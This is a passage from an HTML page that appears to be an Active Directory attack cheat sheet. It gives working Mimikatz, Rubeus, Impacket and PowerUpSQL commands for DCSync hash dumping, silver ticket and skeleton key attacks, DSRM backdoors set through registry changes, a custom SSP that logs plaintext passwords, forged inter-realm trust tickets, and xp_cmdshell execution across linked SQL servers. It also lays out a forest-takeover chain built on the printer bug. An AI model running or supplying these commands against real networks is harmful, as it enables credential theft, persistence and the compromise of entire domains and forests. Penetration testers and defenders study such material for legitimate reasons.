</span><span id="__span-60-7"><a id="__codelineno-60-7" name="__codelineno-60-7" href="#__codelineno-60-7"></a><span class="s1">#DCsync using secretsdump.py from impacket with Kerberos Authentication</span>
</span><span id="__span-60-8"><a id="__codelineno-60-8" name="__codelineno-60-8" href="#__codelineno-60-8"></a><span class="s1">secretsdump.py -no-pass -k &lt;Domain&gt;/&lt;Username&gt;@&lt;DC&#39;</span><span class="n">S</span> <span class="n">IP</span> <span class="n">or</span> <span class="n">FQDN</span><span class="p">&gt;</span> <span class="n">-just-dc-ntlm</span>
</span></code></pre></div>
<p><strong>Tip:</strong> \
 /ptt -&gt; inject ticket on current running session \
 /ticket -&gt; save the ticket on the system for later use</p>
<ul>
<li>Silver Ticket Attack</li>
</ul>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;kerberos::golden /domain:&lt;DomainName&gt; /sid:&lt;DomainSID&gt; /target:&lt;TheTargetMachine&gt; /service:</span>
</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a><span class="s1">&lt;ServiceType&gt; /rc4:&lt;TheSPN&#39;</span><span class="n">s</span> <span class="n">Account</span> <span class="n">NTLM</span> <span class="n">Hash</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">user</span><span class="p">:&lt;</span><span class="n">UserToImpersonate</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">ptt</span><span class="s2">&quot;&#39;</span>
</span></code></pre></div>
<p><a href="https://adsecurity.org/?page_id=183">SPN List</a></p>
<ul>
<li>Skeleton Key Attack</li>
</ul>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a><span class="c">#Exploitation Command runned as DA:</span>
</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;privilege::debug&quot; &quot;misc::skeleton&quot;&#39;</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">DC</span><span class="err">&#39;</span><span class="n">s</span> <span class="n">FQDN</span><span class="p">&gt;</span>
</span><span id="__span-62-3"><a id="__codelineno-62-3" name="__codelineno-62-3" href="#__codelineno-62-3"></a>
</span><span id="__span-62-4"><a id="__codelineno-62-4" name="__codelineno-62-4" href="#__codelineno-62-4"></a><span class="c">#Access using the password &quot;mimikatz&quot;</span>
</span><span id="__span-62-5"><a id="__codelineno-62-5" name="__codelineno-62-5" href="#__codelineno-62-5"></a><span class="nb">Enter-PSSession</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">AnyMachineYouLike</span><span class="p">&gt;</span> <span class="n">-Credential</span> <span class="p">&lt;</span><span class="n">Domain</span><span class="p">&gt;\</span><span class="n">Administrator</span>
</span></code></pre></div>
<ul>
<li>DSRM Abuse</li>
</ul>
<p><em>WUT IS DIS?: Every DC has a local Administrator account, this accounts has the DSRM password which is a SafeBackupPassword. We can get this and then pth its NTLM hash to get local Administrator access to DC!</em></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a><span class="c">#Dump DSRM password (needs DA privs):</span>
</span><span id="__span-63-2"><a id="__codelineno-63-2" name="__codelineno-63-2" href="#__codelineno-63-2"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;token::elevate&quot; &quot;lsadump::sam&quot;&#39;</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">DC</span><span class="s1">&#39;s Name&gt;</span>
</span><span id="__span-63-3"><a id="__codelineno-63-3" name="__codelineno-63-3" href="#__codelineno-63-3"></a>
</span><span id="__span-63-4"><a id="__codelineno-63-4" name="__codelineno-63-4" href="#__codelineno-63-4"></a><span class="s1">#This is a local account, so we can PTH and authenticate!</span>
</span><span id="__span-63-5"><a id="__codelineno-63-5" name="__codelineno-63-5" href="#__codelineno-63-5"></a><span class="s1">#BUT we need to alter the behaviour of the DSRM account before pth:</span>
</span><span id="__span-63-6"><a id="__codelineno-63-6" name="__codelineno-63-6" href="#__codelineno-63-6"></a><span class="s1">#Connect on DC:</span>
</span><span id="__span-63-7"><a id="__codelineno-63-7" name="__codelineno-63-7" href="#__codelineno-63-7"></a><span class="s1">Enter-PSSession -ComputerName &lt;DC&#39;</span><span class="n">s</span> <span class="n">Name</span><span class="p">&gt;</span>
</span><span id="__span-63-8"><a id="__codelineno-63-8" name="__codelineno-63-8" href="#__codelineno-63-8"></a>
</span><span id="__span-63-9"><a id="__codelineno-63-9" name="__codelineno-63-9" href="#__codelineno-63-9"></a><span class="c">#Alter the Logon behaviour on registry:</span>
</span><span id="__span-63-10"><a id="__codelineno-63-10" name="__codelineno-63-10" href="#__codelineno-63-10"></a><span class="nb">New-ItemProperty</span> <span class="s2">&quot;HKLM:\System\CurrentControlSet\Control\Lsa\&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DsrmAdminLogonBehaviour&quot;</span> <span class="n">-Value</span> <span class="n">2</span> <span class="n">-PropertyType</span> <span class="n">DWORD</span> <span class="n">-Verbose</span>
</span><span id="__span-63-11"><a id="__codelineno-63-11" name="__codelineno-63-11" href="#__codelineno-63-11"></a>
</span><span id="__span-63-12"><a id="__codelineno-63-12" name="__codelineno-63-12" href="#__codelineno-63-12"></a><span class="c">#If the property already exists:</span>
</span><span id="__span-63-13"><a id="__codelineno-63-13" name="__codelineno-63-13" href="#__codelineno-63-13"></a><span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\System\CurrentControlSet\Control\Lsa\&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DsrmAdminLogonBehaviour&quot;</span> <span class="n">-Value</span> <span class="n">2</span> <span class="n">-Verbose</span>
</span></code></pre></div>
<p>Then just PTH to get local admin access on DC!</p>
<ul>
<li>Custom SSP</li>
</ul>
<p><em>WUT IS DIS?: We can set our on SSP by dropping a custom dll, for example mimilib.dll from mimikatz, that will monitor and capture plaintext passwords from users that logged on!</em></p>
<p>From powershell:</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a><span class="c">#Get current Security Package:</span>
</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a><span class="nv">$packages</span> <span class="p">=</span> <span class="nb">Get-ItemProperty</span> <span class="s2">&quot;HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\&quot;</span> <span class="n">-Name</span> <span class="s1">&#39;Security Packages&#39;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">-ExpandProperty</span>  <span class="s1">&#39;Security Packages&#39;</span>
</span><span id="__span-64-3"><a id="__codelineno-64-3" name="__codelineno-64-3" href="#__codelineno-64-3"></a>
</span><span id="__span-64-4"><a id="__codelineno-64-4" name="__codelineno-64-4" href="#__codelineno-64-4"></a><span class="c">#Append mimilib:</span>
</span><span id="__span-64-5"><a id="__codelineno-64-5" name="__codelineno-64-5" href="#__codelineno-64-5"></a><span class="nv">$packages</span> <span class="p">+=</span> <span class="s2">&quot;mimilib&quot;</span>
</span><span id="__span-64-6"><a id="__codelineno-64-6" name="__codelineno-64-6" href="#__codelineno-64-6"></a>
</span><span id="__span-64-7"><a id="__codelineno-64-7" name="__codelineno-64-7" href="#__codelineno-64-7"></a><span class="c">#Change the new packages name</span>
</span><span id="__span-64-8"><a id="__codelineno-64-8" name="__codelineno-64-8" href="#__codelineno-64-8"></a><span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\&quot;</span> <span class="n">-Name</span> <span class="s1">&#39;Security Packages&#39;</span> <span class="n">-Value</span> <span class="nv">$packages</span>
</span><span id="__span-64-9"><a id="__codelineno-64-9" name="__codelineno-64-9" href="#__codelineno-64-9"></a><span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\System\CurrentControlSet\Control\Lsa\&quot;</span> <span class="n">-Name</span> <span class="s1">&#39;Security Packages&#39;</span> <span class="n">-Value</span> <span class="nv">$packages</span>
</span><span id="__span-64-10"><a id="__codelineno-64-10" name="__codelineno-64-10" href="#__codelineno-64-10"></a>
</span><span id="__span-64-11"><a id="__codelineno-64-11" name="__codelineno-64-11" href="#__codelineno-64-11"></a><span class="c">#ALTERNATIVE:</span>
</span><span id="__span-64-12"><a id="__codelineno-64-12" name="__codelineno-64-12" href="#__codelineno-64-12"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;misc::memssp&quot;&#39;</span>
</span></code></pre></div>
<p>Now all logons on the DC are logged to -&gt; C:\Windows\System32\kiwissp.log</p>
<h2 id="cross-forest-attacks">Cross Forest Attacks</h2>
<ul>
<li>Trust Tickets</li>
</ul>
<p><em>WUT IS DIS ?: If we have Domain Admin rights on a Domain that has Bidirectional Trust relationship with an other forest we can get the Trust key and forge our own inter-realm TGT.</em></p>
<p>:warning: The access we will have will be limited to what our DA account is configured to have on the other Forest!</p>
<ul>
<li>Using Mimikatz:</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>  #Dump the trust key
</span><span id="__span-65-2"><a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a>  Invoke-Mimikatz -Command &#39;&quot;lsadump::trust /patch&quot;&#39;
</span><span id="__span-65-3"><a id="__codelineno-65-3" name="__codelineno-65-3" href="#__codelineno-65-3"></a>  Invoke-Mimikatz -Command &#39;&quot;lsadump::lsa /patch&quot;&#39;
</span><span id="__span-65-4"><a id="__codelineno-65-4" name="__codelineno-65-4" href="#__codelineno-65-4"></a>
</span><span id="__span-65-5"><a id="__codelineno-65-5" name="__codelineno-65-5" href="#__codelineno-65-5"></a>  #Forge an inter-realm TGT using the Golden Ticket attack
</span><span id="__span-65-6"><a id="__codelineno-65-6" name="__codelineno-65-6" href="#__codelineno-65-6"></a>  Invoke-Mimikatz -Command &#39;&quot;kerberos::golden /user:Administrator /domain:&lt;OurDomain&gt; /sid:
</span><span id="__span-65-7"><a id="__codelineno-65-7" name="__codelineno-65-7" href="#__codelineno-65-7"></a>  &lt;OurDomainSID&gt; /rc4:&lt;TrustKey&gt; /service:krbtgt /target:&lt;TheTargetDomain&gt; /ticket:
</span><span id="__span-65-8"><a id="__codelineno-65-8" name="__codelineno-65-8" href="#__codelineno-65-8"></a>  &lt;PathToSaveTheGoldenTicket&gt;&quot;&#39;
</span></code></pre></div>
<p>:exclamation: Tickets -&gt; .kirbi format</p>
<p>Then Ask for a TGS to the external Forest for any service using the inter-realm TGT and access the resource!</p>
<ul>
<li>Using Rubeus:</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>  .\Rubeus.exe asktgs /ticket:&lt;kirbi file&gt; /service:&quot;Service&#39;s SPN&quot; /ptt
</span></code></pre></div>
<ul>
<li>
<p>Abuse MSSQL Servers</p>
</li>
<li>
<p>Enumerate MSSQL Instances: <code>Get-SQLInstanceDomain</code></p>
</li>
<li>Check Accessibility as current user:</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a>  Get-SQLConnectionTestThreaded
</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a>  Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
</span></code></pre></div>
<ul>
<li>Gather Information about the instance: <code>Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose</code></li>
<li>Abusing SQL Database Links: \
  <em>WUT IS DIS?: A database link allows a SQL Server to access other resources like other SQL Server. If we have two linked SQL Servers we can execute stored procedures in them. Database links also works across Forest Trust!</em></li>
</ul>
<p>Check for existing Database Links:</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a><span class="c">#Check for existing Database Links:</span>
</span><span id="__span-68-2"><a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a><span class="c">#PowerUpSQL:</span>
</span><span id="__span-68-3"><a id="__codelineno-68-3" name="__codelineno-68-3" href="#__codelineno-68-3"></a><span class="nb">Get-SQLServerLink</span> <span class="n">-Instance</span> <span class="p">&lt;</span><span class="n">SPN</span><span class="p">&gt;</span> <span class="n">-Verbose</span>
</span><span id="__span-68-4"><a id="__codelineno-68-4" name="__codelineno-68-4" href="#__codelineno-68-4"></a>
</span><span id="__span-68-5"><a id="__codelineno-68-5" name="__codelineno-68-5" href="#__codelineno-68-5"></a><span class="c">#MSSQL Query:</span>
</span><span id="__span-68-6"><a id="__codelineno-68-6" name="__codelineno-68-6" href="#__codelineno-68-6"></a><span class="nb">select </span><span class="p">*</span> <span class="n">from</span> <span class="n">master</span><span class="p">..</span><span class="n">sysservers</span>
</span></code></pre></div>
<p>Then we can use queries to enumerate other links from the linked Database:</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a><span class="c">#Manualy:</span>
</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a><span class="nb">select </span><span class="p">*</span> <span class="n">from</span> <span class="n">openquery</span><span class="p">(</span><span class="s2">&quot;LinkedDatabase&quot;</span><span class="p">,</span> <span class="s1">&#39;select * from master..sysservers&#39;</span><span class="p">)</span>
</span><span id="__span-69-3"><a id="__codelineno-69-3" name="__codelineno-69-3" href="#__codelineno-69-3"></a>
</span><span id="__span-69-4"><a id="__codelineno-69-4" name="__codelineno-69-4" href="#__codelineno-69-4"></a><span class="c">#PowerUpSQL (Will Enum every link across Forests and Child Domain of the Forests):</span>
</span><span id="__span-69-5"><a id="__codelineno-69-5" name="__codelineno-69-5" href="#__codelineno-69-5"></a><span class="nb">Get-SQLServerLinkCrawl</span> <span class="n">-Instance</span> <span class="p">&lt;</span><span class="n">SPN</span><span class="p">&gt;</span> <span class="n">-Verbose</span>
</span><span id="__span-69-6"><a id="__codelineno-69-6" name="__codelineno-69-6" href="#__codelineno-69-6"></a>
</span><span id="__span-69-7"><a id="__codelineno-69-7" name="__codelineno-69-7" href="#__codelineno-69-7"></a><span class="c">#Then we can execute command on the machine&#39;s were the SQL Service runs using xp_cmdshell</span>
</span><span id="__span-69-8"><a id="__codelineno-69-8" name="__codelineno-69-8" href="#__codelineno-69-8"></a><span class="c">#Or if it is disabled enable it:</span>
</span><span id="__span-69-9"><a id="__codelineno-69-9" name="__codelineno-69-9" href="#__codelineno-69-9"></a><span class="n">EXECUTE</span><span class="p">(</span><span class="s1">&#39;sp_configure &quot;xp_cmdshell&quot;,1;reconfigure;&#39;</span><span class="p">)</span> <span class="n">AT</span> <span class="s2">&quot;SPN&quot;</span>
</span></code></pre></div>
<p>Query execution:</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a><span class="nb">Get-SQLServerLinkCrawl</span> <span class="n">-Instace</span> <span class="p">&lt;</span><span class="n">SPN</span><span class="p">&gt;</span> <span class="n">-Query</span> <span class="s2">&quot;exec master..xp_cmdshell &#39;whoami&#39;&quot;</span>
</span></code></pre></div>
<ul>
<li>Breaking Forest Trusts</li>
</ul>
<p><em>WUT IS DIS?: \
TL;DR \
If we have a bidirectional trust with an external forest and we manage to compromise a machine on the local forest that has enabled unconstrained delegation (DCs have this by default), we can use the printerbug to force the DC of the external forest's root domain to authenticate to us. Then we can capture it's TGT, inject it into memory and DCsync to dump it's hashes, giving ous complete access over the whole forest.</em></p>
<p>Tools we are going to use:</p>
<ul>
<li><a href="https://github.com/samratashok/ADModule">AD Module</a></li>
<li><a href="https://github.com/HarmJ0y/ASREPRoast">ASREPRoast</a></li>
<li><a href="https://github.com/lkarlslund/adalanche">Adalanche</a></li>
<li><a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a></li>
<li><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a></li>
<li><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a></li>
<li><a href="https://github.com/PowerShellMafia/PowerSploit/tree/dev">Powersploit</a></li>
<li><a href="https://github.com/NetSPI/PowerUpSQL">PowerUpSQL</a></li>
<li><a href="https://github.com/Kevin-Robertson/Powermad">Powermad</a></li>
<li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a> -&gt; <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">Compiled Version</a></li>
<li><a href="https://github.com/leechristensen/SpoolSample">SpoolSample</a></li>
</ul>
<p>Exploitation example:</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a><span class="c">#Start monitoring for TGTs with rubeus:</span>
</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">monitor</span> <span class="p">/</span><span class="n">interval</span><span class="p">:</span><span class="n">5</span> <span class="p">/</span><span class="n">filteruser</span><span class="p">:</span><span class="n">target-dc</span><span class="p">$</span>
</span><span id="__span-71-3"><a id="__codelineno-71-3" name="__codelineno-71-3" href="#__codelineno-71-3"></a>
</span><span id="__span-71-4"><a id="__codelineno-71-4" name="__codelineno-71-4" href="#__codelineno-71-4"></a><span class="c">#Execute the printerbug to trigger the force authentication of the target DC to our machine</span>
</span><span id="__span-71-5"><a id="__codelineno-71-5" name="__codelineno-71-5" href="#__codelineno-71-5"></a><span class="n">SpoolSample</span><span class="p">.</span><span class="n">exe</span> <span class="n">target-dc</span><span class="p">$.</span><span class="n">external</span><span class="p">.</span><span class="n">forest</span><span class="p">.</span><span class="n">local</span> <span class="n">dc</span><span class="p">.</span><span class="n">compromised</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span>
</span><span id="__span-71-6"><a id="__codelineno-71-6" name="__codelineno-71-6" href="#__codelineno-71-6"></a>
</span><span id="__span-71-7"><a id="__codelineno-71-7" name="__codelineno-71-7" href="#__codelineno-71-7"></a><span class="c">#Get the base64 captured TGT from Rubeus and inject it into memory:</span>
</span><span id="__span-71-8"><a id="__codelineno-71-8" name="__codelineno-71-8" href="#__codelineno-71-8"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">ptt</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:&lt;</span><span class="n">Base64ValueofCapturedTicket</span><span class="p">&gt;</span>
</span><span id="__span-71-9"><a id="__codelineno-71-9" name="__codelineno-71-9" href="#__codelineno-71-9"></a>
</span><span id="__span-71-10"><a id="__codelineno-71-10" name="__codelineno-71-10" href="#__codelineno-71-10"></a><span class="c">#Dump the hashes of the target domain using mimikatz:</span>
</span><span id="__span-71-11"><a id="__codelineno-71-11" name="__codelineno-71-11" href="#__codelineno-71-11"></a><span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">external</span><span class="p">.</span><span class="n">forest</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">all</span>
</span></code></pre></div>
<p>Detailed Articles:</p>
<ul>
<li><a href="https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/">Not A Security Boundary: Breaking Forest Trusts</a></li>
<li><a href="https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1">Hunting in Active Directory: Unconstrained Delegation &amp; Forests Trusts</a></li>
</ul>

  <br>
    

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/os/windows/active-directory/cheat sheet.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
</footer>

</body>
</html>